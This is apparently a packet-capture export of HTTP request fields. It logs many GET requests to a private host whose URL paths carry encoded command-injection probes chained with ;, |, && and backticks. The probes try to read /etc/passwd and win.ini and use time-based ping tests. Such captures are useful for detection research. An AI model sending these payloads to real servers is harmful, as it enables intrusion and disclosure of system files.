http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																											192.168.1.106									20						1	http://192.168.1.106/web/admin%0auploads%0a/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/admin%0auploads%0a/
																											192.168.1.106									85						1	http://192.168.1.106/%20run%20type%20%25SYSTEMROOT%25%5cwin.ini		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20run%20type%20%25SYSTEMROOT%25%5cwin.ini
																											192.168.1.106									90						1	http://192.168.1.106/web%20%252fbin%252fcat%20%252fetc%252fpasswd		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%20%252fbin%252fcat%20%252fetc%252fpasswd
																											192.168.1.106									92						1	http://192.168.1.106/web%20type%20%25SYSTEMROOT%25%5cwin.ini		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%20type%20%25SYSTEMROOT%25%5cwin.ini
																											192.168.1.106									93						1	http://192.168.1.106/web%26%26%20%252fbin%252fcat%20%252fetc%252fpasswd		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%26%26%20%252fbin%252fcat%20%252fetc%252fpasswd
																											192.168.1.106									95						1	http://192.168.1.106/web%26%26%20type%20%25SYSTEMROOT%25%5cwin.ini		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%26%26%20type%20%25SYSTEMROOT%25%5cwin.ini
																											192.168.1.106									96						1	http://192.168.1.106/web%7c%20%252fbin%252fcat%20%252fetc%252fpasswd		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%7c%20%252fbin%252fcat%20%252fetc%252fpasswd
																											192.168.1.106									97						1	http://192.168.1.106/web%7c%20type%20%25SYSTEMROOT%25%5cwin.ini		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%7c%20type%20%25SYSTEMROOT%25%5cwin.ini
																											192.168.1.106									98						1	http://192.168.1.106/web%3b%20%252fbin%252fcat%20%252fetc%252fpasswd		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%3b%20%252fbin%252fcat%20%252fetc%252fpasswd
																											192.168.1.106									99						1	http://192.168.1.106/web%3b%20type%20%25SYSTEMROOT%25%5cwin.ini		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%3b%20type%20%25SYSTEMROOT%25%5cwin.ini
																											192.168.1.106									101						1	http://192.168.1.106/web%20%60%252fbin%252fcat%20%252fetc%252fpasswd%60		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%20%60%252fbin%252fcat%20%252fetc%252fpasswd%60
																											192.168.1.106									102						1	http://192.168.1.106/web%20run%20type%20%25SYSTEMROOT%25%5cwin.ini		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%20run%20type%20%25SYSTEMROOT%25%5cwin.ini
																											192.168.1.106									121						1	http://192.168.1.106/web		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web
																											192.168.1.106									124						1	http://192.168.1.106/web		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web
																											192.168.1.106									89						1	http://192.168.1.106/web/admin%0auploads%0a/should_not_xist_vvvvvvvvvvvvvv		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/admin%0auploads%0a/should_not_xist_vvvvvvvvvvvvvv
																											192.168.1.106									143						1	http://192.168.1.106/%20ping%20-n%206%20localhost		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20ping%20-n%206%20localhost
																											192.168.1.106									147						1	http://192.168.1.106/%20ping%20-c%206%20localhost		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20ping%20-c%206%20localhost
																											192.168.1.106									148						1	http://192.168.1.106/%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20
																											192.168.1.106									149						1	http://192.168.1.106/%26%26%20ping%20-n%206%20localhost		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%26%26%20ping%20-n%206%20localhost
																											192.168.1.106									150						1	http://192.168.1.106/%26%26%20ping%20-c%206%20localhost		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%26%26%20ping%20-c%206%20localhost
																											192.168.1.106									151						1	http://192.168.1.106/%26%26%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%26%26%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20
																											192.168.1.106									152						1	http://192.168.1.106/%7c%20ping%20-n%206%20localhost		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%7c%20ping%20-n%206%20localhost
																											192.168.1.106									153						1	http://192.168.1.106/%7c%20ping%20-c%206%20localhost		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%7c%20ping%20-c%206%20localhost
																											192.168.1.106									155						1	http://192.168.1.106/%7c%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%7c%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20
																											192.168.1.106									156						1	http://192.168.1.106/%3b%20ping%20-n%206%20localhost		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%3b%20ping%20-n%206%20localhost
																											192.168.1.106									157						1	http://192.168.1.106/%3b%20ping%20-c%206%20localhost		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%3b%20ping%20-c%206%20localhost
																											192.168.1.106									168						1	http://192.168.1.106/%3b%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%3b%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20
																											192.168.1.106									179						1	http://192.168.1.106/%20%60ping%20-c%206%20localhost%60		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20%60ping%20-c%206%20localhost%60
																											192.168.1.106									181						1	http://192.168.1.106/%20run%20ping%20-n%206%20localhost		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20run%20ping%20-n%206%20localhost
																											192.168.1.106									182						1	http://192.168.1.106/web%20ping%20-n%206%20localhost		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%20ping%20-n%206%20localhost
																											192.168.1.106									183						1	http://192.168.1.106/web%20ping%20-c%206%20localhost		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%20ping%20-c%206%20localhost
																											192.168.1.106									184						1	http://192.168.1.106/web%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20
																											192.168.1.106									186						1	http://192.168.1.106/web%26%26%20ping%20-n%206%20localhost		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%26%26%20ping%20-n%206%20localhost
																											192.168.1.106									187						1	http://192.168.1.106/web%26%26%20ping%20-c%206%20localhost		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%26%26%20ping%20-c%206%20localhost
																											192.168.1.106									188						1	http://192.168.1.106/web%26%26%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%26%26%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20
																											192.168.1.106									189						1	http://192.168.1.106/web%7c%20ping%20-n%206%20localhost		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%7c%20ping%20-n%206%20localhost
																											192.168.1.106									145						1	http://192.168.1.106/web/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																											192.168.1.106									190						1	http://192.168.1.106/web%7c%20ping%20-c%206%20localhost		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%7c%20ping%20-c%206%20localhost
																											192.168.1.106									192						1	http://192.168.1.106/web%7c%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%7c%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20
																											192.168.1.106									193						1	http://192.168.1.106/web%3b%20ping%20-n%206%20localhost		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%3b%20ping%20-n%206%20localhost
																											192.168.1.106									194						1	http://192.168.1.106/web%3b%20ping%20-c%206%20localhost		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%3b%20ping%20-c%206%20localhost
																											192.168.1.106									196						1	http://192.168.1.106/web%3b%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%3b%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20
																											192.168.1.106									197						1	http://192.168.1.106/web%20%60ping%20-c%206%20localhost%60		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%20%60ping%20-c%206%20localhost%60
																											192.168.1.106									198						1	http://192.168.1.106/web%20run%20ping%20-n%206%20localhost		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%20run%20ping%20-n%206%20localhost
																											192.168.1.106									191						1	http://192.168.1.106/%20%252fbin%252fcat%20%252fetc%252fpasswd/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20%252fbin%252fcat%20%252fetc%252fpasswd/
																											192.168.1.106									217						1	http://192.168.1.106/%20type%20%25SYSTEMROOT%25%5cwin.ini/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20type%20%25SYSTEMROOT%25%5cwin.ini/
																											192.168.1.106									218						1	http://192.168.1.106/%26%26%20%252fbin%252fcat%20%252fetc%252fpasswd/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%26%26%20%252fbin%252fcat%20%252fetc%252fpasswd/
																											192.168.1.106									219						1	http://192.168.1.106/%26%26%20type%20%25SYSTEMROOT%25%5cwin.ini/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%26%26%20type%20%25SYSTEMROOT%25%5cwin.ini/
																											192.168.1.106									220						1	http://192.168.1.106/%7c%20%252fbin%252fcat%20%252fetc%252fpasswd/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%7c%20%252fbin%252fcat%20%252fetc%252fpasswd/
																											192.168.1.106									221						1	http://192.168.1.106/%7c%20type%20%25SYSTEMROOT%25%5cwin.ini/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%7c%20type%20%25SYSTEMROOT%25%5cwin.ini/
																											192.168.1.106									222						1	http://192.168.1.106/%3b%20%252fbin%252fcat%20%252fetc%252fpasswd/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%3b%20%252fbin%252fcat%20%252fetc%252fpasswd/
																											192.168.1.106									223						1	http://192.168.1.106/%3b%20type%20%25SYSTEMROOT%25%5cwin.ini/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%3b%20type%20%25SYSTEMROOT%25%5cwin.ini/
																											192.168.1.106									224						1	http://192.168.1.106/%20%60%252fbin%252fcat%20%252fetc%252fpasswd%60/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20%60%252fbin%252fcat%20%252fetc%252fpasswd%60/
																											192.168.1.106									225						1	http://192.168.1.106/%20run%20type%20%25SYSTEMROOT%25%5cwin.ini/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20run%20type%20%25SYSTEMROOT%25%5cwin.ini/
																											192.168.1.106									226						1	http://192.168.1.106/web%20%252fbin%252fcat%20%252fetc%252fpasswd/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%20%252fbin%252fcat%20%252fetc%252fpasswd/
																											192.168.1.106									227						1	http://192.168.1.106/web%20type%20%25SYSTEMROOT%25%5cwin.ini/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%20type%20%25SYSTEMROOT%25%5cwin.ini/
																											192.168.1.106									228						1	http://192.168.1.106/web%26%26%20%252fbin%252fcat%20%252fetc%252fpasswd/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%26%26%20%252fbin%252fcat%20%252fetc%252fpasswd/
																											192.168.1.106									229						1	http://192.168.1.106/web%26%26%20type%20%25SYSTEMROOT%25%5cwin.ini/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%26%26%20type%20%25SYSTEMROOT%25%5cwin.ini/
																											192.168.1.106									230						1	http://192.168.1.106/web%7c%20%252fbin%252fcat%20%252fetc%252fpasswd/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%7c%20%252fbin%252fcat%20%252fetc%252fpasswd/
																											192.168.1.106									231						1	http://192.168.1.106/web%7c%20type%20%25SYSTEMROOT%25%5cwin.ini/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%7c%20type%20%25SYSTEMROOT%25%5cwin.ini/
																											192.168.1.106									232						1	http://192.168.1.106/web%3b%20%252fbin%252fcat%20%252fetc%252fpasswd/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%3b%20%252fbin%252fcat%20%252fetc%252fpasswd/
																											192.168.1.106									234						1	http://192.168.1.106/web%3b%20type%20%25SYSTEMROOT%25%5cwin.ini/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%3b%20type%20%25SYSTEMROOT%25%5cwin.ini/
																											192.168.1.106									235						1	http://192.168.1.106/web%20%60%252fbin%252fcat%20%252fetc%252fpasswd%60/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%20%60%252fbin%252fcat%20%252fetc%252fpasswd%60/
																											192.168.1.106									236						1	http://192.168.1.106/web%20run%20type%20%25SYSTEMROOT%25%5cwin.ini/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%20run%20type%20%25SYSTEMROOT%25%5cwin.ini/
																											192.168.1.106									237						1	http://192.168.1.106/web/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																											192.168.1.106									238						1	http://192.168.1.106/web/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web/
																											192.168.1.106									255						1	http://192.168.1.106/%20ping%20-n%206%20localhost/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20ping%20-n%206%20localhost/
																											192.168.1.106									272						1	http://192.168.1.106/%20ping%20-c%206%20localhost/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20ping%20-c%206%20localhost/
																											192.168.1.106									273						1	http://192.168.1.106/%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20/
																											192.168.1.106									274						1	http://192.168.1.106/%26%26%20ping%20-n%206%20localhost/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%26%26%20ping%20-n%206%20localhost/
																											192.168.1.106									275						1	http://192.168.1.106/%26%26%20ping%20-c%206%20localhost/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%26%26%20ping%20-c%206%20localhost/
																											192.168.1.106									276						1	http://192.168.1.106/%26%26%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%26%26%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20/
																											192.168.1.106									277						1	http://192.168.1.106/%7c%20ping%20-n%206%20localhost/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%7c%20ping%20-n%206%20localhost/
																											192.168.1.106									278						1	http://192.168.1.106/%7c%20ping%20-c%206%20localhost/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%7c%20ping%20-c%206%20localhost/
																											192.168.1.106									280						1	http://192.168.1.106/%7c%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%7c%20%252fusr%252fsbin%252fping%20-s%20localhost%201000%206%20/
																											192.168.1.106									281						1	http://192.168.1.106/%3b%20ping%20-n%206%20localhost/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%3b%20ping%20-n%206%20localhost/
																											192.168.1.106									282						1	http://192.168.1.106/%3b%20ping%20-c%206%20localhost/		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%3b%20ping%20-c%206%20localhost/
